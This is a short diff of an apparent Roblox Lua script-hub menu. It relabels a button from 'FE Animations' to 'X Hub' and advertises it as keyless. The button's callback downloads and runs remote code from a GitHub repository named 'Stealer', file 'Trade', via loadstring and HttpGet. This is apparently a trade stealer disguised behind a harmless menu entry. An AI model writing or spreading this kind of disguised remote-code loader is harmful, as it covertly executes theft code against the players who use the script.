@@ -44,7 +44,7 @@ tab.newButton(
 )
 
 tab.newButton(
-    "FE Animations",
+    "X Hub",
     "Status: 🟢 This is keyless! ^^",
     function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade"))()
